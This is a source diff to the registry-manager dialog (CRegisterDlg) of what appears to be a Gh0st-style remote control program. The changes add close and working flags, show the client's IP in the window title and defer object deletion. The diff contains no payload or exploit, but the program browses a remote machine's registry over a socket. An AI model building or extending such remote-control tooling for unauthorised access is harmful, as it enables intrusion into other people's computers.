@@ -29,12 +29,15 @@ IMPLEMENT_DYNAMIC(CRegisterDlg, CDialog)
 CRegisterDlg::CRegisterDlg(CWnd* pParent,IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
 	: CDialog(CRegisterDlg::IDD, pParent)
 {
+	m_bIsClosed = FALSE;
+	m_bIsWorking = FALSE;
 	m_iocpServer	= IOCPServer;
 	m_ContextObject	= ContextObject;
 }
 
 CRegisterDlg::~CRegisterDlg()
 {
+	printf("~CRegisterDlg \n");
 }
 
 void CRegisterDlg::DoDataExchange(CDataExchange* pDX)
@@ -59,6 +62,14 @@ BOOL CRegisterDlg::OnInitDialog()
 	CDialog::OnInitDialog();
 
 	// TODO:  在此添加额外的初始化
+	CString str;
+	sockaddr_in  ClientAddr;
+	memset(&ClientAddr, 0, sizeof(ClientAddr));
+	int ClientAddrLen = sizeof(ClientAddr);
+	BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&ClientAddr, &ClientAddrLen);
+
+	str.Format("%s - 注册表管理", bResult != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "");
+	SetWindowText(str);
 
 	m_ImageListTree.Create(18, 18, ILC_COLOR16,10, 0);   //制作 树控件上的图标
 
@@ -94,15 +105,14 @@ BOOL CRegisterDlg::OnInitDialog()
 	// 异常: OCX 属性页应返回 FALSE
 }
 
-
 void CRegisterDlg::OnClose()
 {
-	// TODO: 在此添加消息处理程序代码和/或调用默认值
 	m_ContextObject->v1 = 0;
 	CancelIo((HANDLE)m_ContextObject->sClientSocket);
 	closesocket(m_ContextObject->sClientSocket);
 	CDialog::OnClose();
-	delete this;
+	m_bIsClosed = TRUE;
+	//delete this;
 }
 
 
@@ -161,7 +171,6 @@ CString CRegisterDlg::GetFullPath(HTREEITEM hCurrent)
 			strTemp += "\\";
 		strReturn = strTemp  + strReturn;
 		hCurrent = m_Tree.GetParentItem(hCurrent);   //得到父的
-
 	}
 	return strReturn;
 }
@@ -171,7 +180,6 @@ char CRegisterDlg::GetFatherPath(CString& strFullPath)
 	char bToken;
 	if(!strFullPath.Find("HKEY_CLASSES_ROOT"))	//判断主键
 	{
-
 		bToken=MHKEY_CLASSES_ROOT;
 		strFullPath.Delete(0,sizeof("HKEY_CLASSES_ROOT"));
 	}else if(!strFullPath.Find("HKEY_CURRENT_USER"))
@@ -201,25 +209,24 @@ char CRegisterDlg::GetFatherPath(CString& strFullPath)
 
 void CRegisterDlg::OnReceiveComplete(void)
 {
+	m_bIsWorking = TRUE;
 	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
 	{
-
 	case TOKEN_REG_PATH:
 		{
 			AddPath((char*)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1)));
 			break;
 		}
-
 	case TOKEN_REG_KEY:
 		{
 			AddKey((char*)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1)));
 			break;
 		}
-
 	default:
 		// 传输发生异常数据
 		break;
 	}
+	m_bIsWorking = FALSE;
 }
 
 
@@ -238,9 +245,10 @@ void CRegisterDlg::AddPath(char* szBuffer)
 	memcpy((void*)&msg,szBuffer,msgsize);
 	DWORD size =msg.size;
 	int count=msg.count;
-
 	if(size>0&&count>0){                   //一点保护措施
 		for(int i=0;i<count;i++){
+			if (m_bIsClosed)
+				break;
 			char* szKeyName=szBuffer+size*i+msgsize;
 			m_Tree.InsertItem(szKeyName,1,1,m_hSelectedItem,0);//插入子键名称
 			m_Tree.Expand(m_hSelectedItem,TVE_EXPAND);
@@ -258,9 +266,11 @@ void CRegisterDlg::AddKey(char* szBuffer)
 	if(szBuffer==NULL) return;
 	REGMSG msg;
 	memcpy((void*)&msg,szBuffer,sizeof(msg));
-	char* szTemp=szBuffer+sizeof(msg);  
+	char* szTemp=szBuffer+sizeof(msg);
 	for(int i=0;i<msg.count;i++)
 	{
+		if (m_bIsClosed)
+			break;
 		BYTE Type=szTemp[0];   //类型
 		szTemp+=sizeof(BYTE);
 		char* szValueName=szTemp;   //取出名字
